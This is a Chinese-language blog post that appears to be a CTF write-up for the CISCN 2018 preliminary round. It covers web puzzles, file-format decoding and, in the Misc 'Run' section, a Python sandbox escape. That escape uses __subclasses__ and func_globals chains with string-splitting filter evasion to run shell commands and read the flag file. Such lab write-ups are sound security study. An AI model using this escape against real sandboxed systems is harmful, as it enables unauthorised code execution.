---
layout: post
title: CISCN 2018 初赛 Write-up
date: 2018-05-28 15:25:24.000000000 +08:00
tags: writeup
---

多年不更新，趁有时间整理一下最近比赛的writeup.

## Web
### Easyweb
。。。找了半天的注入点发现是空密码我会告诉你？

### Picture
下载到的 PNG（实际是 JPG）尾部添加了 zlib 数据。

binwalk –e 提取之，发现是 base64 编码；解码之，获得一个文件头是“4B 50”的文件。

修改为“50 4B”，发现是压缩包，提示密码是“ZeroDivisionError: …………”
用 python 被零除的默认错误信息实验（integer division or modulo by zero）（感谢某lth大佬提供脑洞），成功解压

解压出的文件是 uuencoded，uudecode 之，获得 flag

### Flag_in_your_head 
Js 实际是 MD5 实现，但 binl 中添加了一个 ck 函数 

    function ck(s) {
        try {
            ic
        } catch (e) {
            return;
        }
        var a = [118, 104, 102, 120, 117, 108, 119, 124, 48,123,01,121];
        if (s.length == a.length) {
            for (i = 0; i < s.length; i++) {
                if (a[i] - s.charCodeAt(i) != 3)
                    return ic = false;
            }
            return ic = true;
        }
        return ic = false;
    } 

显而易见，将 A 的各元素 ASCII-3，获得 Token：*security-xbv*。传入，获得 flag.

## Misc
### Run
比较典型的 Python 沙盒逃逸。
首先先用 object 基类的__subclasses__子类内的 file 子类，可以构成文件读取：

    [].__class__.__base__.__subclasses__()[40]('/home/ctf/sandbox.py')

虽然不能直接 getshell，注意到退出时的错误信息 leak 出文件名，可以读取到源码。

此时的直接想法是利用 warnings.catch_warnings 类 linecache 引入的 os 模块，执行系统命
令；但是 func_globals 被 ls 规则过滤，故使用如下 payload:

    >>> p = ‘func_global’ + ‘s’
    >>> o = [].__class__.__base__.__subclasses__()[59].__init__.__func__.__getattribute__(p)['linecache'].__dict__.values()[12].__dict__.values()[144]
    >>> c = ‘l’ + ‘s /home/ctf/’
    >>> o(c)
    5c72a1d444cf3121a5d25f2db4147ebb
    bin
    cpython.py
    cpython.pyc
    sandbox.py
    >>> c = 'ca' + 't /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'
    >>> o(c)
    ciscn{62a20588ef9766b418537c763366ea0c}

## RE
### 